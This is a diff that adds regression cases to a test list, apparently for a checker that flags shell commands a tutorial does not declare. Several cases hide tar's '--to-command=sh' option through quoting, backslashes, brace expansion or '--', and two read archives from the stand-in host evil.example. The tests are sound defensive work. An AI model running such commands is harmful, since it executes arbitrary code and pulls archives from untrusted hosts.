@@ -452,6 +452,50 @@ REGRESSION_CASES = [
     ('tar with an option cluster outside the one the tutorial runs is undeclared',
      'tar -xzvf x.tar.gz -K member',
      ['tar -xzvf x.tar.gz -K member']),
+    # The second verify on PR #1128. The check reads words before the shell
+    # removes quotes and expands braces, so a word whose text is not plain
+    # is refused outright rather than guessed at. A `host:path` archive is a
+    # remote archive to GNU tar.
+    ('tar with a double-quoted long option is undeclared',
+     'tar -xzf a.tar.gz "--to-command=sh"',
+     ['tar -xzf a.tar.gz "--to-command=sh"']),
+    ('tar with a single-quoted long option is undeclared',
+     "tar -xzf a.tar.gz '--to-command=sh'",
+     ["tar -xzf a.tar.gz '--to-command=sh'"]),
+    ('tar with a backslash before a long option is undeclared',
+     'tar -xzf a.tar.gz \\--to-command=sh',
+     ['tar -xzf a.tar.gz \\--to-command=sh']),
+    ('tar with an empty quoted prefix before a long option is undeclared',
+     "tar -xzf a.tar.gz ''--to-command=sh",
+     ["tar -xzf a.tar.gz ''--to-command=sh"]),
+    ('tar with a brace expansion that yields a long option is undeclared',
+     'tar -xzf a.tar.gz {--to-command=sh,x}',
+     ['tar -xzf a.tar.gz {--to-command=sh,x}']),
+    ('tar reading a remote archive from host:path is undeclared',
+     'tar -xzf evil.example:/x.tar.gz',
+     ['tar -xzf evil.example:/x.tar.gz']),
+    ('tar reading a remote archive from user@host:path is undeclared',
+     'tar -xzf user@evil.example:x.tar.gz',
+     ['tar -xzf user@evil.example:x.tar.gz']),
+    ('tar with -- ending its options before a long option is undeclared',
+     'tar -xzf a.tar.gz -- --to-command=sh',
+     ['tar -xzf a.tar.gz -- --to-command=sh']),
+    ('tar with an attached -C value is undeclared',
+     'tar -xzf a.tar.gz -C/tmp',
+     ['tar -xzf a.tar.gz -C/tmp']),
+    ('tar reading its archive from standard input is undeclared',
+     'tar -xzf -',
+     ['tar -xzf -']),
+    ('curl with a quoted release URL is undeclared',
+     'curl -fsSLO "https://github.com/headwater-ai/headwater/releases/download/'
+     'v0.2.1/x.tar.gz"',
+     ['curl -fsSLO "https://github.com/headwater-ai/headwater/releases/download/'
+      'v0.2.1/x.tar.gz"']),
+    ('the macOS install line is not undeclared',
+     'curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
+     'v0.2.1/headwater-v0.2.1-aarch64-apple-darwin.tar.gz\n'
+     'tar -xzf headwater-v0.2.1-aarch64-apple-darwin.tar.gz -C ~/.local/bin headwater',
+     []),
     ('step 1 scaffolding is not undeclared',
      'mkdir -p ~/headwater-tutorial/docs/decisions\n'
      'cd ~/headwater-tutorial\n'
